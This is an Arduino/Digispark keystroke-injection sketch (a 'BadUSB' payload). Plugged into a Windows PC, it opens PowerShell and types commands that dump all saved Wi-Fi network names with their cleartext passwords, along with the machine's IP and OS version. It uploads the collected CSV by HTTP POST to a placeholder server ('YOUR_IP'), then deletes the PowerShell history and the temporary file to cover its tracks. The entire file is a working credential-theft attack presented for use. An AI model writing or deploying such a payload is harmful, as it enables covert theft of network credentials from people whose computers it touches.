#include "DigiKeyboard.h"

#define KEY_R 0x15

void setup() {
  pinMode(1, OUTPUT);  // onboard LED
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);

  // Open PowerShell from Win+R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(150);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800); // wait for PS window to be ready

  // $csvPath = "$env:TEMP\temp.csv"
  DigiKeyboard.print(
    F("$csvPath = \"$env:TEMP\\temp.csv\"")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  // Public IP (optional) - wrapped in try/catch to avoid breaking when offline
  DigiKeyboard.print(
    F("try {$ip = (Invoke-RestMethod -Uri \"https://api.ipify.org?format=json\" -ErrorAction Stop).ip} ")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(250);
  DigiKeyboard.print(
    F("catch {$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceOperationalStatus -eq \"Up\" -and $_.IPAddress -notlike \"127.*\" } | Select-Object -First 1 -ExpandProperty IPAddress)}")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);

  // $os
  DigiKeyboard.print(
    F("$os = (Get-CimInstance Win32_OperatingSystem).Caption")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  // $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | %{ $_.Line.Split(':')[1].Trim() }
  DigiKeyboard.print(
    F("$profiles = (netsh wlan show profiles) | Select-String \"All User Profile\" | %{ $_.Line.Split(':')[1].Trim() }")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1200);

  // $wifi = foreach($p in $profiles) { ... }
  DigiKeyboard.print(
    F("$wifi = foreach($p in $profiles){")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(250);

  DigiKeyboard.print(
    F("$dump = netsh wlan show profile name=\\\"$p\\\" key=clear;")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print(
    F("$pass = $dump | Select-String \"Key Content\" | %{ $_.Line.Split(':')[1].Trim() };")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print(
    F("[PSCustomObject]@{SSID=$p; Pass=$pass; IP=$ip; OS=$os} }")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000); // allow netsh loop

  // Export to CSV
  DigiKeyboard.print(
    F("$wifi | Export-Csv $csvPath -NoTypeInformation")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000); // allow Export-Csv to finish

  // $b = Get-Content $csvPath -Raw
  DigiKeyboard.print(
    F("$b = Get-Content $csvPath -Raw")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);

  // Invoke-WebRequest to YOUR_IP (replace with real server IP)
  DigiKeyboard.print(
    F("Invoke-WebRequest -UseBasicParsing -Uri 'http://YOUR_IP/wifi-recv.php' -Method POST -Body $b")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500); // allow HTTP + PHP

  // Clear PS history
  DigiKeyboard.print(
    F("del (Get-PSReadlineOption).HistorySavePath")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  // Remove CSV
  DigiKeyboard.print(
    F("Remove-Item $csvPath -ErrorAction SilentlyContinue")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  // Exit PowerShell
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Blink LED forever to signal completion
  while (true) {
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(200);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(200);
  }
}
